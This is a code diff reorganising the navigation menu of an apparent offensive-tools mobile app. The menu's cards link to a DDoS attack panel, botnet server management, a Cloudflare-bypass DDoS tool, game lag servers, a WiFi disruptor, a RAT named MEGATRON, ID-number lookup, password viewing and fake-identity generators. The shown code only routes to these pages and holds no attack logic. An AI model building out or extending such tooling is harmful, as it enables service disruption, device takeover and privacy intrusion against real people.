@@ -30,6 +30,8 @@ import 'ip_geo.dart';
 import 'speed_test.dart';
 import 'build_apk_page.dart';
 import 'password_check_page.dart';
+import 'source_grabber_page.dart';
+import 'vuln_scanner_page.dart';
 
 import 'rat/rat_client.dart';
 import 'rat/rat_device_list_page.dart';
@@ -70,35 +72,27 @@ class ToolsPage extends StatelessWidget {
                 badge: "LIVE",
                 badgeColor: AppTheme.coral,
                 desc: "Launch & monitor attacks",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => AttackPanel(
-                        sessionKey: sessionKey,
-                        listDoos: listDoos,
-                      ),
-                    ),
-                  );
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => AttackPanel(sessionKey: sessionKey, listDoos: listDoos))),
               ),
               _buildToolCard(
                 context: context,
                 icon: Icons.dns,
                 label: "Manage Server",
                 desc: "Control your botnet nodes",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => ManageServerPage(keyToken: sessionKey),
-                    ),
-                  );
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => ManageServerPage(keyToken: sessionKey))),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.cloud_off,
+                label: "DDoS Cloudflare",
+                badge: "NEW",
+                badgeColor: AppTheme.sky,
+                desc: "Bypass CF & DDoS attack",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const DDoSCloudflarePage())),
               ),
             ]),
             const SizedBox(height: 22),
-            _buildSectionLabel("GAME LAG TOOLS"),
+            _buildSectionLabel("GAME TOOLS"),
             const SizedBox(height: 10),
             _buildToolsGrid([
               _buildToolCard(
@@ -108,14 +102,7 @@ class ToolsPage extends StatelessWidget {
                 badge: "GAME",
                 badgeColor: AppTheme.peach,
                 desc: "Lag server Free Fire",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const FreeFireLagServerPage(),
-                    ),
-                  );
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const FreeFireLagServerPage())),
               ),
               _buildToolCard(
                 context: context,
@@ -124,18 +111,23 @@ class ToolsPage extends StatelessWidget {
                 badge: "GAME",
                 badgeColor: AppTheme.sky,
                 desc: "Lag server Mobile Legends",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => MlbbLagPage(sessionKey: sessionKey))),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.phone_android,
+                label: "MEGATRON",
+                badge: "RAT",
+                badgeColor: AppTheme.coral,
+                desc: "Remote access & device control",
                 onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => MlbbLagPage(sessionKey: sessionKey),
-                    ),
-                  );
+                  final client = RatClient(sessionKey);
+                  Navigator.push(context, MaterialPageRoute(builder: (_) => RatDeviceListPage(client: client)));
                 },
               ),
             ]),
             const SizedBox(height: 22),
-            _buildSectionLabel("NETWORK OPERATIONS"),
+            _buildSectionLabel("NETWORK & WIFI"),
             const SizedBox(height: 10),
             _buildToolsGrid([
               _buildToolCard(
@@ -145,9 +137,7 @@ class ToolsPage extends StatelessWidget {
                 badge: "NEW",
                 badgeColor: AppTheme.mint,
                 desc: "Send anonymous messages",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => const NglPage()));
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const NglPage())),
               ),
               _buildToolCard(
                 context: context,
@@ -155,9 +145,7 @@ class ToolsPage extends StatelessWidget {
                 label: "WiFi Killer",
                 desc: "Internal network disruptor",
                 subLabel: "Internal",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => WifiInternalPage(sessionKey: sessionKey)));
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => WifiInternalPage(sessionKey: sessionKey))),
               ),
               if (['developer', 'all_akses', 'owner', 'vip'].contains(userRole))
                 _buildToolCard(
@@ -168,21 +156,18 @@ class ToolsPage extends StatelessWidget {
                   badgeColor: AppTheme.gold,
                   desc: "External network attack",
                   subLabel: "External",
-                  onTap: () {
-                    Navigator.push(context, MaterialPageRoute(builder: (_) => const WifiKillerPage()));
-                  },
+                  onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const WifiKillerPage())),
                 ),
               _buildToolCard(
                 context: context,
-                icon: Icons.vpn_key,
-                label: "WiFi Scanner",
-                locked: true,
-                desc: "Scan nearby networks",
-                onTap: () => _showComingSoon(context),
+                icon: Icons.speed,
+                label: "Speed Test",
+                desc: "Test ping & internet speed",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const SpeedTestPage())),
               ),
             ]),
             const SizedBox(height: 22),
-            _buildSectionLabel("OSINT & INVESTIGATION"),
+            _buildSectionLabel("OSINT & SECURITY"),
             const SizedBox(height: 10),
             _buildToolsGrid([
               _buildToolCard(
@@ -190,60 +175,48 @@ class ToolsPage extends StatelessWidget {
                 icon: Icons.badge,
                 label: "NIK Detail",
                 desc: "Lookup KTP information",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => const NikCheckerPage()));
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const NikCheckerPage())),
               ),
               _buildToolCard(
                 context: context,
                 icon: Icons.domain,
                 label: "Domain OSINT",
                 desc: "Domain reconnaissance",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => const DomainOsintPage()));
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const DomainOsintPage())),
               ),
               _buildToolCard(
                 context: context,
-                icon: Icons.person_search,
-                label: "Phone Lookup",
-                locked: true,
-                desc: "Number intelligence",
-                onTap: () => _showComingSoon(context),
+                icon: Icons.manage_search,
+                label: "WHOIS Lookup",
+                desc: "Domain registration info",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const WhoisPage())),
               ),
               _buildToolCard(
                 context: context,
-                icon: Icons.email,
-                label: "Email OSINT",
-                locked: true,
-                desc: "Email breach lookup",
-                onTap: () => _showComingSoon(context),
+                icon: Icons.location_searching,
+                label: "IP Geolocation",
+                desc: "Trace IP location & ISP",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const IpGeoPage())),
               ),
-            ]),
-            const SizedBox(height: 22),
-            _buildSectionLabel("DEVICE MANAGEMENT"),
-            const SizedBox(height: 10),
-            _buildToolsGrid([
               _buildToolCard(
                 context: context,
-                icon: Icons.phone_android,
-                label: "MEGATRON",
-                badge: "RAT",
+                icon: Icons.shield,
+                label: "Vuln Scanner",
+                badge: "AI",
                 badgeColor: AppTheme.coral,
-                desc: "Remote access & device control",
-                onTap: () {
-                  final client = RatClient(sessionKey);
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => RatDeviceListPage(client: client),
-                    ),
-                  );
-                },
+                desc: "Scan kerentanan website",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const VulnScannerPage())),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.search,
+                label: "Web Scanner",
+                desc: "Website security scanner",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const WebScannerPage())),
               ),
             ]),
             const SizedBox(height: 22),
-            _buildSectionLabel("SOCIAL MEDIA DOWNLOADER"),
+            _buildSectionLabel("SOCIAL MEDIA"),
             const SizedBox(height: 10),
             _buildToolsGrid([
               _buildToolCard(
@@ -251,278 +224,14 @@ class ToolsPage extends StatelessWidget {
                 icon: Icons.video_library,
                 label: "TikTok Downloader",
                 desc: "Save videos without watermark",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => const TiktokDownloaderPage()));
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const TiktokDownloaderPage())),
               ),
               _buildToolCard(
                 context: context,
                 icon: Icons.camera_alt,
                 label: "Instagram Downloader",
                 desc: "Reels, stories & posts",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => const InstagramDownloaderPage()));
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.play_circle_outline,
-                label: "YouTube Downloader",
-                locked: true,
-                desc: "Video & audio extraction",
-                onTap: () => _showComingSoon(context),
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.music_note,
-                label: "Spotify Downloader",
-                locked: true,
-                desc: "Song & playlist saver",
-                onTap: () => _showComingSoon(context),
-              ),
-            ]),
-            const SizedBox(height: 22),
-            _buildSectionLabel("UTILITIES & EXTRA TOOLS"),
-            const SizedBox(height: 10),
-            _buildToolsGrid([
-              _buildToolCard(
-                context: context,
-                icon: Icons.qr_code,
-                label: "QR Generator",
-                desc: "Create custom QR codes",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => const QrGeneratorPage()));
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.security,
-                label: "IP Scanner",
-                locked: true,
-                desc: "Network host discovery",
-                onTap: () => _showComingSoon(context),
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.network_check,
-                label: "Port Scanner",
-                locked: true,
-                desc: "Service enumeration",
-                onTap: () => _showComingSoon(context),
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.password,
-                label: "Password Gen",
-                locked: true,
-                desc: "Secure random passwords",
-                onTap: () => _showComingSoon(context),
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.android_rounded,
-                label: "Build APK",
-                badge: "DEV",
-                badgeColor: AppTheme.mint,
-                desc: "Compile & share APK",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => BuildApkPage(sessionKey: sessionKey, username: username)));
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.lock_open_rounded,
-                label: "Check Password",
-                badge: "ACC",
-                badgeColor: AppTheme.coral,
-                desc: "Lihat password akun",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => PasswordCheckPage(sessionKey: sessionKey, username: username)));
-                },
-              ),
-            ]),
-            const SizedBox(height: 22),
-            _buildSectionLabel("RANDOM TOOLS"),
-            const SizedBox(height: 10),
-            _buildToolsGrid([
-              _buildToolCard(
-                context: context,
-                icon: Icons.cloud_off,
-                label: "DDoS Cloudflare",
-                badge: "NEW",
-                badgeColor: AppTheme.sky,
-                desc: "Bypass CF & DDoS attack",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const DDoSCloudflarePage(),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.upload_file,
-                label: "Upload Media",
-                desc: "Upload ke Catbox & get URI",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => CatboxUploaderPage(
-                        username: sessionKey,
-                        role: userRole,
-                        totalTools: listDoos.length,
-                      ),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.code,
-                label: "Base64 Encrypt",
-                badge: "NEW",
-                badgeColor: AppTheme.mint,
-                desc: "Encode & decode Base64",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const EncryptionRavenClawx(),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.psychology,
-                label: "IQC Screenshot",
-                desc: "Create WhatsApp screenshot",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const IQCScreen(),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.calculate,
-                label: "Converter",
-                badge: "NEW",
-                badgeColor: AppTheme.coral,
-                desc: "Currency & unit converter",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const ConverterPage(),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.bolt,
-                label: "HoxtenAI",
-                badge: "AI",
-                badgeColor: AppTheme.lavender,
-                desc: "AI assistant with Groq",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => AIPage(
-                        username: sessionKey,
-                        sessionKey: sessionKey,
-                      ),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.person_add_alt_1,
-                label: "Fake Identity",
-                badge: "NEW",
-                badgeColor: AppTheme.peach,
-                desc: "Generate dummy identity",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const FakeIdentityPage(),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.manage_search,
-                label: "WHOIS Lookup",
-                badge: "NEW",
-                badgeColor: AppTheme.mint,
-                desc: "Domain registration info",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const WhoisPage(),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.search,
-                label: "Web Scanner",
-                badge: "NEW",
-                badgeColor: AppTheme.gold,
-                desc: "Website security scanner",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const WebScannerPage(),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.location_searching,
-                label: "IP Geolocation",
-                badge: "NEW",
-                badgeColor: AppTheme.sky,
-                desc: "Trace IP location & ISP",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const IpGeoPage(),
-                    ),
-                  );
-                },
-              ),
-              _buildToolCard(
-                context: context,
-                icon: Icons.speed,
-                label: "Speed Test",
-                badge: "NEW",
-                badgeColor: AppTheme.mint,
-                desc: "Test ping & internet speed",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const SpeedTestPage(),
-                    ),
-                  );
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const InstagramDownloaderPage())),
               ),
               _buildToolCard(
                 context: context,
@@ -531,20 +240,101 @@ class ToolsPage extends StatelessWidget {
                 badge: "VIP",
                 badgeColor: AppTheme.coral,
                 desc: "Boost followers & likes",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => TiktokBoosterPage(sessionKey: sessionKey))),
+              ),
+            ]),
+            const SizedBox(height: 22),
+            _buildSectionLabel("WEB TOOLS"),
+            const SizedBox(height: 10),
+            _buildToolsGrid([
+              _buildToolCard(
+                context: context,
+                icon: Icons.code,
+                label: "Source Grabber",
+                badge: "NEW",
+                badgeColor: AppTheme.mint,
+                desc: "Ambil source code website",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const SourceGrabberPage())),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.qr_code,
+                label: "QR Generator",
+                desc: "Create custom QR codes",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const QrGeneratorPage())),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.upload_file,
+                label: "Upload Media",
+                desc: "Upload ke Catbox & get URI",
                 onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => TiktokBoosterPage(
-                        sessionKey: sessionKey,
-                      ),
-                    ),
-                  );
+                  Navigator.push(context, MaterialPageRoute(builder: (_) => CatboxUploaderPage(username: sessionKey, role: userRole, totalTools: listDoos.length)));
                 },
               ),
             ]),
             const SizedBox(height: 22),
-            _buildSectionLabel("ENTERTAINMENT & MEDIA"),
+            _buildSectionLabel("UTILITIES"),
+            const SizedBox(height: 10),
+            _buildToolsGrid([
+              _buildToolCard(
+                context: context,
+                icon: Icons.bolt,
+                label: "HoxtenAI",
+                badge: "AI",
+                badgeColor: AppTheme.lavender,
+                desc: "AI assistant with Groq",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => AIPage(username: sessionKey, sessionKey: sessionKey))),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.code,
+                label: "Base64 Encrypt",
+                desc: "Encode & decode Base64",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const EncryptionRavenClawx())),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.calculate,
+                label: "Converter",
+                desc: "Currency & unit converter",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const ConverterPage())),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.person_add_alt_1,
+                label: "Fake Identity",
+                desc: "Generate dummy identity",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const FakeIdentityPage())),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.psychology,
+                label: "IQC Screenshot",
+                desc: "Create WhatsApp screenshot",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const IQCScreen())),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.lock_open_rounded,
+                label: "Check Password",
+                badge: "ACC",
+                badgeColor: AppTheme.coral,
+                desc: "Lihat password akun",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => PasswordCheckPage(sessionKey: sessionKey, username: username))),
+              ),
+              _buildToolCard(
+                context: context,
+                icon: Icons.android_rounded,
+                label: "Build APK",
+                badge: "DEV",
+                badgeColor: AppTheme.mint,
+                desc: "Compile & share APK",
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => BuildApkPage(sessionKey: sessionKey, username: username))),
+              ),
+            ]),
+            const SizedBox(height: 22),
+            _buildSectionLabel("ENTERTAINMENT"),
             const SizedBox(height: 10),
             _buildToolsGrid([
               _buildToolCard(
@@ -552,9 +342,7 @@ class ToolsPage extends StatelessWidget {
                 icon: Icons.live_tv,
                 label: "Anime Streaming",
                 desc: "Watch anime for free",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => const HomeAnimePage()));
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const HomeAnimePage())),
               ),
               _buildToolCard(
                 context: context,
@@ -563,25 +351,14 @@ class ToolsPage extends StatelessWidget {
                 badge: "18+",
                 badgeColor: AppTheme.coral,
                 desc: "Adult content library",
-                onTap: () {
-                  Navigator.push(context, MaterialPageRoute(builder: (_) => const hentai.HomeScreen()));
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const hentai.HomeScreen())),
               ),
               _buildToolCard(
                 context: context,
                 icon: Icons.book,
                 label: "Comic Reader",
-                badge: "NEW",
-                badgeColor: AppTheme.lavender,
                 desc: "Read comics online",
-                onTap: () {
-                  Navigator.push(
-                    context,
-                    MaterialPageRoute(
-                      builder: (_) => const ComicPage(),
-                    ),
-                  );
-                },
+                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const ComicPage())),
               ),
             ]),
             const SizedBox(height: 28),
